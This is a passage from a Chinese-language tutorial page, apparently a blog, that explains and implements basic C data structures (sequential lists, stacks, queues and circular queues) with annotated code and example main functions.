class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><h4 id="建立-1"><a href="#建立-1" class="headerlink" title="建立"></a>建立</h4><p>顺序表（或称数组）是一个线性表，使用一段连续的存储空间来存储数据元素。在C语言中，通常通过动态分配内存来创建顺序表，以支持动态扩展。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span>* data;    <span class="hljs-comment">// 存储数据的指针</span><br>    <span class="hljs-type">int</span> size;     <span class="hljs-comment">// 当前元素个数</span><br>    <span class="hljs-type">int</span> capacity; <span class="hljs-comment">// 顺序表的容量</span><br>&#125; SeqList;<br><br><span class="hljs-comment">// 初始化顺序表</span><br>SeqList* <span class="hljs-title function_">createSeqList</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity)</span> &#123;<br>    SeqList* <span class="hljs-built_in">list</span> = (SeqList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(SeqList));<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;data = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * initialCapacity);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">list</span>-&gt;data) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation error\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(<span class="hljs-built_in">list</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;size = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">list</span>-&gt;capacity = initialCapacity;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h4><p>复制顺序表通常是指创建一个新的顺序表，其内容与现有的顺序表相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">SeqList* <span class="hljs-title function_">copySeqList</span><span class="hljs-params">(SeqList* original)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!original) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    SeqList* newList = createSeqList(original-&gt;capacity);<br>    <span class="hljs-keyword">if</span> (!newList) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; original-&gt;size; i++) &#123;<br>        newList-&gt;data[i] = original-&gt;data[i];<br>    &#125;<br>    newList-&gt;size = original-&gt;size;<br><br>    <span class="hljs-keyword">return</span> newList;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个代码段展示了如何在C语言中创建和复制顺序表。<code>createSeqList</code>函数用于创建并初始化一个指定容量的顺序表，而<code>copySeqList</code>函数则根据原始顺序表创建一个内容相同的新顺序表。</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h4><p>顺序栈是一种基于数组实现的栈结构，遵循“后进先出”（LIFO）的原则。栈的操作主要包括进栈（Push）和出栈（Pop）。</p><h4 id="建立-2"><a href="#建立-2" class="headerlink" title="建立"></a>建立</h4><p>建立顺序栈通常需要定义一个结构体来包含栈的数组和栈顶指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100  <span class="hljs-comment">// 定义栈的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> data[MAX_SIZE];  <span class="hljs-comment">// 存储栈元素的数组</span><br>    <span class="hljs-type">int</span> top;             <span class="hljs-comment">// 栈顶指针</span><br>&#125; SeqStack;<br><br><span class="hljs-comment">// 初始化栈</span><br>SeqStack* <span class="hljs-title function_">createStack</span><span class="hljs-params">()</span> &#123;<br>    SeqStack* <span class="hljs-built_in">stack</span> = (SeqStack*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(SeqStack));<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">stack</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">stack</span>-&gt;top = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 栈顶初始化为-1，表示栈为空</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">stack</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h4><p>进栈操作将一个元素压入栈中。首先检查栈是否已满，若未满则将元素添加到栈顶。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">push</span><span class="hljs-params">(SeqStack* <span class="hljs-built_in">stack</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stack</span>-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 栈是否已满</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack overflow\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">stack</span>-&gt;data[++(<span class="hljs-built_in">stack</span>-&gt;top)] = value;  <span class="hljs-comment">// 栈顶指针加1后赋值</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="出栈操作"><a href="#出栈操作" class="headerlink" title="出栈操作"></a>出栈操作</h4><p>出栈操作从栈顶弹出一个元素。首先检查栈是否为空，若不为空则弹出栈顶元素并返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(SeqStack* <span class="hljs-built_in">stack</span>, <span class="hljs-type">int</span>* value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stack</span>-&gt;top == <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// 栈是否为空</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack underflow\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *value = <span class="hljs-built_in">stack</span>-&gt;data[(<span class="hljs-built_in">stack</span>-&gt;top)--];  <span class="hljs-comment">// 取出栈顶元素，栈顶指针减1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法"></a>示例用法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SeqStack* <span class="hljs-built_in">stack</span> = createStack();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">stack</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    push(<span class="hljs-built_in">stack</span>, <span class="hljs-number">10</span>);<br>    push(<span class="hljs-built_in">stack</span>, <span class="hljs-number">20</span>);<br>    push(<span class="hljs-built_in">stack</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">if</span> (pop(<span class="hljs-built_in">stack</span>, &amp;value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Popped: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (pop(<span class="hljs-built_in">stack</span>, &amp;value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Popped: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码展示了如何创建一个顺序栈，并进行进栈和出栈操作。<code>push</code>函数用于将元素压入栈中，而<code>pop</code>函数则用于从栈中弹出元素。</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列是一种先进先出（FIFO）的数据结构，元素从队尾入队，从队头出队。它的基本操作包括入队（Enqueue）、出队（Dequeue）、取队头（Peek&#x2F;Front）和判定队空（IsEmpty）。</p><h4 id="建立-3"><a href="#建立-3" class="headerlink" title="建立"></a>建立</h4><p>队列可以通过顺序表（数组）或链表来实现。这里以数组为基础实现一个循环队列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100  <span class="hljs-comment">// 定义队列的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> data[MAX_SIZE];  <span class="hljs-comment">// 存储队列元素的数组</span><br>    <span class="hljs-type">int</span> front;           <span class="hljs-comment">// 队头指针</span><br>    <span class="hljs-type">int</span> rear;            <span class="hljs-comment">// 队尾指针</span><br>&#125; Queue;<br><br><span class="hljs-comment">// 初始化队列</span><br>Queue* <span class="hljs-title function_">createQueue</span><span class="hljs-params">()</span> &#123;<br>    Queue* <span class="hljs-built_in">queue</span> = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">queue</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">queue</span>-&gt;front = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化队头</span><br>    <span class="hljs-built_in">queue</span>-&gt;rear = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 初始化队尾</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="进队操作"><a href="#进队操作" class="headerlink" title="进队操作"></a>进队操作</h4><p>进队操作将一个元素添加到队尾。首先检查队列是否已满，若未满则将元素加入队列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">enqueue</span><span class="hljs-params">(Queue* <span class="hljs-built_in">queue</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">queue</span>-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE == <span class="hljs-built_in">queue</span>-&gt;front) &#123;  <span class="hljs-comment">// 判断队列是否满</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue overflow\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">queue</span>-&gt;data[<span class="hljs-built_in">queue</span>-&gt;rear] = value;<br>    <span class="hljs-built_in">queue</span>-&gt;rear = (<span class="hljs-built_in">queue</span>-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE;  <span class="hljs-comment">// 队尾指针循环前进</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="出队操作"><a href="#出队操作" class="headerlink" title="出队操作"></a>出队操作</h4><p>出队操作从队头移除一个元素。首先检查队列是否为空，若不为空则移除队头元素并返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dequeue</span><span class="hljs-params">(Queue* <span class="hljs-built_in">queue</span>, <span class="hljs-type">int</span>* value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;front == <span class="hljs-built_in">queue</span>-&gt;rear) &#123;  <span class="hljs-comment">// 判断队列是否为空</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue underflow\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *value = <span class="hljs-built_in">queue</span>-&gt;data[<span class="hljs-built_in">queue</span>-&gt;front];<br>    <span class="hljs-built_in">queue</span>-&gt;front = (<span class="hljs-built_in">queue</span>-&gt;front + <span class="hljs-number">1</span>) % MAX_SIZE;  <span class="hljs-comment">// 队头指针循环前进</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="取队头操作"><a href="#取队头操作" class="headerlink" title="取队头操作"></a>取队头操作</h4><p>取队头操作获取队列的第一个元素，但不移除它。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">front</span><span class="hljs-params">(Queue* <span class="hljs-built_in">queue</span>, <span class="hljs-type">int</span>* value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;front == <span class="hljs-built_in">queue</span>-&gt;rear) &#123;  <span class="hljs-comment">// 判断队列是否为空</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue is empty\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *value = <span class="hljs-built_in">queue</span>-&gt;data[<span class="hljs-built_in">queue</span>-&gt;front];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="判定队空"><a href="#判定队空" class="headerlink" title="判定队空"></a>判定队空</h4><p>判定队列是否为空。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(Queue* <span class="hljs-built_in">queue</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>-&gt;front == <span class="hljs-built_in">queue</span>-&gt;rear;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="示例用法-1"><a href="#示例用法-1" class="headerlink" title="示例用法"></a>示例用法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    Queue* <span class="hljs-built_in">queue</span> = createQueue();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">queue</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    enqueue(<span class="hljs-built_in">queue</span>, <span class="hljs-number">10</span>);<br>    enqueue(<span class="hljs-built_in">queue</span>, <span class="hljs-number">20</span>);<br>    enqueue(<span class="hljs-built_in">queue</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">if</span> (dequeue(<span class="hljs-built_in">queue</span>, &amp;value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dequeued: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (front(<span class="hljs-built_in">queue</span>, &amp;value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Front: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (isEmpty(<span class="hljs-built_in">queue</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue is empty\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue is not empty\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个例子中，队列的基本操作得到了实现和展示。<code>enqueue</code>函数用于将元素添加到队列，<code>dequeue</code>函数则用于从队列中移除元素，<code>front</code>函数可以查看队头元素而不移除，<code>isEmpty</code>函数则用于判断队列是否为空。</p><h3 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h3><p>循环队列是队列的一种变形，它使用数组实现，并通过将队尾指针和队头指针进行“环绕”处理，以有效利用数组空间。以下是循环队列的进队和出队操作。</p><h4 id="循环队列的结构定义"><a href="#循环队列的结构定义" class="headerlink" title="循环队列的结构定义"></a>循环队列的结构定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100  <span class="hljs-comment">// 定义循环队列的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> data[MAX_SIZE];  <span class="hljs-comment">// 存储队列元素的数组</span><br>    <span class="hljs-type">int</span> front;           <span class="hljs-comment">// 队头指针</span><br>    <span class="hljs-type">int</span> rear;            <span class="hljs-comment">// 队尾指针</span><br>&#125; CircularQueue;<br><br><span class="hljs-comment">// 初始化循环队列</span><br>CircularQueue* <span class="hljs-title function_">createCircularQueue</span><span class="hljs-params">()</span> &#123;<br>    CircularQueue* <span class="hljs-built_in">queue</span> = (CircularQueue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CircularQueue));<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">queue</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">queue</span>-&gt;front = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化队头指针</span><br>    <span class="hljs-built_in">queue</span>-&gt;rear = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 初始化队尾指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="进队操作（Enqueue）"><a href="#进队操作（Enqueue）" class="headerlink" title="进队操作（Enqueue）"></a>进队操作（Enqueue）</h4><p>进队操作将元素添加到队尾。首先判断队列是否已满。若未满，则将元素加入到队尾，并更新队尾指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">enqueue</span><span class="hljs-params">(CircularQueue* <span class="hljs-built_in">queue</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">queue</span>-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE == <span class="hljs-built_in">queue</span>-&gt;front) &#123;  <span class="hljs-comment">// 判断队列是否满</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue overflow\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">queue</span>-&gt;data[<span class="hljs-built_in">queue</span>-&gt;rear] = value;<br>    <span class="hljs-built_in">queue</span>-&gt;rear = (<span class="hljs-built_in">queue</span>-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE;  <span class="hljs-comment">// 队尾指针循环前进</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="出队操作（Dequeue）"><a href="#出队操作（Dequeue）" class="headerlink" title="出队操作（Dequeue）"></a>出队操作（Dequeue）</h4><p>出队操作从队头移除一个元素。首先判断队列是否为空。若不为空，则移除队头元素，并更新队头指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dequeue</span><span class="hljs-params">(CircularQueue* <span class="hljs-built_in">queue</span>, <span class="hljs-type">int</span>* value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;front == <span class="hljs-built_in">queue</span>-&gt;rear) &#123;  <span class="hljs-comment">// 判断队列是否为空</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Queue underflow\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *value = <span class="hljs-built_in">queue</span>-&gt;data[<span class="hljs-built_in">queue</span>-&gt;front];<br>    <span class="hljs-built_in">queue</span>-&gt;front = (<span class="hljs-built_in">queue</span>-&gt;front + <span class="hljs-number">1</span>) % MAX_SIZE;  <span class="hljs-comment">// 队头指针循环前进</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="示例用法-2"><a href="#示例用法-2" class="headerlink" title="示例用法"></a>示例用法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    CircularQueue* <span class="hljs-built_in">queue</span> = createCircularQueue();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">queue</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    enqueue(<span class="hljs-built_in">queue</span>, <span class="hljs-number">10</span>);<br>    enqueue(<span class="hljs-built_in">queue</span>, <span class="hljs-number">20</span>);<br>    enqueue(<span class="hljs-built_in">queue</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">if</span> (dequeue(<span class="hljs-built_in">queue</span>, &amp;value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dequeued: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dequeue(<span class="hljs-built_in">queue</span>, &amp;value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dequeued: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (enqueue(<span class="hljs-built_in">queue</span>, 